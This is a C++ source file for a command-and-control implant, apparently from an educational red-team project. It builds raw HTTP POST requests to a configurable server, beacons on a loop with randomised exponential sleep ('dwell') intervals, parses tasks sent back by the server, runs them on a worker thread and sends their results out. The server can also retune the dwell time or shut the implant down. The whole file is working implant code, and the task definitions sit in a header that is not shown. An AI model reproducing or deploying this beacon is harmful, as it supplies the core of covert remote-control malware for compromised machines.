/*
 * This file is subject to the terms and conditions defined in
 * file 'LICENSE', which is part of this source code package.
 */
#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#endif
#include <boost/asio.hpp>
#include "implant.h"
#include "tasks.h"
#include <algorithm>
#include <boost/property_tree/json_parser.hpp>
#include <boost/property_tree/ptree.hpp>
#include <boost/uuid/uuid_io.hpp>
#include <chrono>
#include <iostream>
#include <ostream>
#include <thread>

// Note: from Chapter 20 of C++ Crash Course
//       c.f.
//       https://github.com/JLospinoso/ccc/blob/master/chapter_20/web_request.cpp
[[nodiscard]] std::string make_request(std::string_view host,
                                       std::string_view service,
                                       std::string_view payload,
                                       boost::asio::io_context &io_context) {
  std::stringstream request_stream;
  request_stream << "POST / HTTP/1.1\r\n"
                    "Host: "
                 << host
                 << "\r\n"
                    "Accept: application/json\r\n"
                    "Accept-Language: en-us\r\n"
                    "Accept-Encoding: identity\r\n"
                    "Connection: close\r\n"
                    "Content-Length: "
                 << payload.size() << "\r\n"
                 << "\r\n"
                 << payload;
  const auto request = request_stream.str();
  boost::asio::ip::tcp::resolver resolver{io_context};
  const auto endpoints = resolver.resolve(host, service);
  boost::asio::ip::tcp::socket socket{io_context};
  const auto connected_endpoint = boost::asio::connect(socket, endpoints);
  boost::asio::write(socket, boost::asio::buffer(request));
  std::string response;
  boost::system::error_code ec;
  boost::asio::read(socket, boost::asio::dynamic_buffer(response), ec);
  if (ec && ec.value() != 2)
    throw boost::system::system_error{ec};
  return response;
}

Implant::Implant(std::string host, std::string service,
                 boost::asio::io_context &io_context)
    : host{std::move(host)}, service{std::move(service)},
      io_context{io_context}, is_running(true), dwell_distribution_seconds{1.},
      task_thread{std::async(std::launch::async, [this] { service_tasks(); })} {
}

void Implant::serve() {
  while (is_running) {
    try {
      std::cout << "Sending results.\n";
      const auto response = send_results();
      std::cout << "Response: " << response << "\nParsing tasks.\n";
      parse_tasks(response);
    } catch (const std::exception &e) {
      std::cerr << e.what() << std::endl;
    }
    const auto sleep_time_double = dwell_distribution_seconds(device);
    const auto sleep_time_chrono = std::chrono::seconds{
        static_cast<unsigned long long>(sleep_time_double)};
    std::this_thread::sleep_for(sleep_time_chrono);
  }
}

[[nodiscard]] std::string Implant::send_results() {
  boost::property_tree::ptree results_local;
  {
    std::scoped_lock<std::mutex> results_lock{results_mutex};
    results_local.swap(results);
  }
  std::stringstream results_ss;
  boost::property_tree::write_json(results_ss, results_local);
  return make_request(host, service, results_ss.str(), io_context);
}
void Implant::parse_tasks(const std::string &response) {
  std::stringstream response_ss{response};
  boost::property_tree::ptree tasks_ptree;
  boost::property_tree::read_json(response_ss, tasks_ptree);
  for (const auto &[task_tree_key, task_tree_value] : tasks_ptree) {
    {
      std::scoped_lock<std::mutex> task_lock{task_mutex};
      tasks.push_back(
          parse_task_from(task_tree_value, [this](const auto &configuration) {
            set_mean_dwell(configuration.mean_dwell);
            set_running(configuration.is_running);
          }));
    }
  }
}
void Implant::set_mean_dwell(double mean_dwell) {
  dwell_distribution_seconds =
      std::exponential_distribution<double>(1. / mean_dwell);
}
void Implant::set_running(bool is_running_in) { is_running = is_running_in; }
void Implant::service_tasks() {
  while (is_running) {
    std::vector<Task> local_tasks;
    {
      std::scoped_lock<std::mutex> task_lock{task_mutex};
      tasks.swap(local_tasks);
    }
    for (const auto &task : local_tasks) {
      const auto [id, contents, success] =
          std::visit([](const auto &task) { return task.run(); }, task);
      {
        std::scoped_lock<std::mutex> results_lock{results_mutex};
        results.add(boost::uuids::to_string(id) + ".contents", contents);
        results.add(boost::uuids::to_string(id) + ".success", success);
      }
    }
    std::this_thread::sleep_for(std::chrono::seconds{1});
  }
}
